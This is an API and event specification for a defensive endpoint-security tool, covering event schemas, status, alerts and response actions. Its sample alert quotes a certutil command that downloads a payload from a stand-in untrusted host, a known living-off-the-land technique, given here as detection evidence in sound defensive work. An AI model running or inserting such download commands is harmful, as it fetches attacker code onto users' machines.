# Personal Cybersecurity Bot — API & Event Specification (v1.0.0)

## 1. Versioned Event Envelope

Every persisted or streamed event follows this immutable specification:

```typescript
export interface EventEnvelope {
  event_id: string;              // UUIDv4 (e.g., "evt-550e8400-e29b-41d4-a716-446655440000")
  schema_version: string;        // SemVer string, currently "1.0.0"
  event_type: string;            // E.g., "process.spawn.suspicious", "file.entropy.high"
  occurred_at_utc: string;       // ISO 8601 UTC timestamp of occurrence
  observed_at_utc: string;       // ISO 8601 UTC timestamp of observation
  sequence: number;              // Monotonically increasing sequence number per boot
  correlation_id: string;        // Correlation identifier tying related events together
  source: string;                // Telemetry source (e.g., "adapter:windows:process")
  object_ref: string;            // Affected entity reference (e.g., "proc:pid:4820")
  severity: "info" | "low" | "medium" | "high" | "critical";
  confidence: number;            // 0.00 to 1.00 calibration score
  coverage_state: "active" | "degraded" | "unknown" | "mocked";
  redacted_evidence_refs: string[]; // Pointer IDs to sanitized evidence records
  retention_class: "security_audit" | "transient_telemetry" | "quarantine_ledger";
  payload: Record<string, unknown>;
}
```

### Envelope Handling Rules
1. **Duplicate `event_id`**: Rejected and logged as an idempotency no-op.
2. **Missing Sequence Numbers**: Flagged as `telemetry_gap` in the timeline.
3. **Late Events / Clock Skew**: Timestamps with $|T_{\text{observed}} - T_{\text{occurred}}| > 300\text{s}$ are tagged with `clock_skew_detected: true` and reconciled without corrupting chronological sorting.
4. **Schema Mismatch**: Events with major schema version $>1$ are preserved in raw vault format and flagged as `unsupported_schema_version`.

---

## 2. API Endpoints Specification

All endpoints require the HTTP header:
`Authorization: Bearer <IPC_SESSION_TOKEN>`

### 2.1 `GET /api/v1/status`
- **Description**: Returns deterministic protection state, sentence-level explanation, coverage matrix, and health summary.
- **Precedence Order**:
  - `red`: Service stopped, critical failure, or $<2$ essential adapters active.
  - `unknown`: Protection service cannot reach native adapters or prove state.
  - `yellow`: Protection active, but 1 or more capabilities degraded/stale.
  - `green`: All required capabilities active and verified within the last 60 seconds.
- **Response `200 OK`**:
```json
{
  "status_code": "green",
  "label": "Protection Active",
  "explanation": "All local security safeguards are running normally. No active threats detected.",
  "coverage_items": [
    {
      "id": "process",
      "name": "Process & Execution Guard",
      "status": "active",
      "last_checked_utc": "2026-09-28T01:50:00.000Z",
      "details": "Monitoring active processes for unauthorized execution and living-off-the-land techniques."
    },
    {
      "id": "network",
      "name": "Network Connection Monitor",
      "status": "active",
      "last_checked_utc": "2026-09-28T01:50:00.000Z",
      "details": "Loopback and outbound connection inspection active."
    },
    {
      "id": "download",
      "name": "Download & Attachment Guard",
      "status": "active",
      "last_checked_utc": "2026-09-28T01:50:00.000Z",
      "details": "Safe inspection of incoming browser and email downloads in user directories."
    },
    {
      "id": "file",
      "name": "File & Canary Shield",
      "status": "active",
      "last_checked_utc": "2026-09-28T01:50:00.000Z",
      "details": "Watching honey-token files for mass-encryption patterns."
    },
    {
      "id": "usb",
      "name": "Removable Media Monitor",
      "status": "active",
      "last_checked_utc": "2026-09-28T01:50:00.000Z",
      "details": "Read-only inspection for newly inserted USB storage."
    },
    {
      "id": "browser_phishing",
      "name": "Phishing Link Assistant",
      "status": "active",
      "last_checked_utc": "2026-09-28T01:50:00.000Z",
      "details": "Basic heuristic checks for suspicious homograph and credential harvesting URLs."
    },
    {
      "id": "ransomware",
      "name": "Ransomware Early Warning",
      "status": "active",
      "last_checked_utc": "2026-09-28T01:50:00.000Z",
      "details": "Canary tripwire active. Rapid file modification alarms armed."
    }
  ],
  "last_verified_at_utc": "2026-09-28T01:50:00.000Z",
  "unknown_reasons": [],
  "service_health": {
    "status": "healthy",
    "cpu_percent": 0.8,
    "memory_mb": 42.4,
    "uptime_seconds": 18450,
    "database_status": "ok",
    "queue_size": 0
  },
  "recommended_next_step": "No action needed. Your system is safe and monitored."
}
```

---

### 2.2 `GET /api/v1/capabilities`
- **Description**: Returns all declared capabilities, their implementation status (`active`, `degraded`, `mocked`, `unsupported`), and reason notes.
- **Response `200 OK`**:
```json
{
  "capabilities": [
    {
      "id": "cap:process:stop",
      "name": "Stop Suspicious Process",
      "state": "active",
      "requires_elevation": false,
      "rollback_supported": false,
      "description": "Terminates a process identified as anomalous or hostile with graceful SIGTERM then SIGKILL."
    },
    {
      "id": "cap:file:quarantine",
      "name": "Quarantine File",
      "state": "active",
      "requires_elevation": false,
      "rollback_supported": true,
      "description": "Moves a suspicious file into the local encrypted vault with metadata preservation."
    },
    {
      "id": "cap:file:restore",
      "name": "Restore Quarantined File",
      "state": "active",
      "requires_elevation": false,
      "rollback_supported": true,
      "description": "Restores a quarantined file to its original or selected safe location after review."
    },
    {
      "id": "cap:network:isolate",
      "name": "Panic Network Isolation",
      "state": "active",
      "requires_elevation": true,
      "rollback_supported": true,
      "description": "Temporarily restricts non-loopback network traffic while leaving localhost security IPC alive."
    }
  ]
}
```

---

### 2.3 `GET /api/v1/alerts` and `GET /api/v1/alerts/{id}`
- **Parameters**: `page`, `pageSize`, `state` (`unresolved` | `resolved` | `all`), `severity`, `type`, `timeRange`.
- **Response `200 OK`**:
```json
{
  "alerts": [
    {
      "id": "alt-8921",
      "title": "Suspicious Command Line Utility Activity",
      "severity": "high",
      "state": "unresolved",
      "detector_id": "rule:lolbin:certutil_download",
      "detector_version": "1.2.0",
      "created_at_utc": "2026-09-28T01:45:12.000Z",
      "confidence": 0.92,
      "confidence_rationale": "Certutil utility was invoked with URL cache download flags by an unsigned process.",
      "plain_language_summary": "Personal Cybersecurity Bot noticed a Windows system tool (certutil) being used to download an unexpected file from the internet.",
      "why_risky": "Attackers frequently use built-in Windows tools to secretly download malicious files without triggering basic antivirus filters.",
      "what_product_did": "Blocked the network connection and suspended the parent process pending your decision.",
      "recommendation": "Safely stop the suspicious process and move the downloaded payload into quarantine.",
      "evidence": {
        "process_name": "certutil.exe",
        "pid": 4820,
        "command_line": "certutil.exe -urlcache -split -f https://untrusted-site.example/payload.bin",
        "parent_process": "powershell.exe (PID 3104)",
        "destination_path": "%USERPROFILE%\\Downloads\\payload.bin",
        "file_hash_sha256": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
      },
      "timeline": [
        { "timestamp_utc": "2026-09-28T01:45:10.000Z", "description": "PowerShell spawned by user session" },
        { "timestamp_utc": "2026-09-28T01:45:12.000Z", "description": "Certutil executed with remote download parameter" },
        { "timestamp_utc": "2026-09-28T01:45:13.000Z", "description": "Heuristic rule triggered; alert generated" }
      ],
      "supported_actions": ["stop", "quarantine", "dismiss"]
    }
  ],
  "total": 1,
  "page": 1,
  "pageSize": 10
}
```

---

### 2.4 Sensitive Actions & Operation Lifecycle
Endpoints:
- `POST /api/v1/actions/stop`
- `POST /api/v1/actions/quarantine`
- `POST /api/v1/actions/freeze`
- `POST /api/v1/actions/restore`
- `POST /api/v1/actions/panic`
- `GET /api/v1/operations/{operation_id}`
- `POST /api/v1/operations/{operation_id}/cancel`

#### Request Payload:
```json
{
  "idempotency_key": "idem-99120-a88b",
  "target": "proc:pid:4820",
  "reason_code": "USER_INITIATED_SUSPICIOUS_STOP",
  "dry_run": false
}
```

#### Response `202 Accepted` / `200 OK`:
```json
{
  "operation_id": "op-44810-bb2",
  "idempotency_key": "idem-99120-a88b",
  "status": "succeeded",
  "actor": "local_user",
  "target": "proc:pid:4820",
  "scope": "process_termination",
  "capability": "cap:process:stop",
  "reason_code": "USER_INITIATED_SUSPICIOUS_STOP",
  "requested_at_utc": "2026-09-28T01:46:00.000Z",
  "expires_at_utc": "2026-09-28T01:48:00.000Z",
  "timeout_ms": 5000,
  "rollback_supported": false,
  "rollback_result": null,
  "audit_event_id": "evt-77194",
  "message": "Process PID 4820 was successfully terminated."
}
```

---

### 2.5 `GET /api/v1/events/stream` (SSE Transport)
- Server-Sent Events stream transmitting `EventEnvelope` instances.
- Reconnection supported via standard `Last-Event-ID` header.
- Periodic keep-alive heartbeat `: ping\n\n` emitted every 15 seconds.
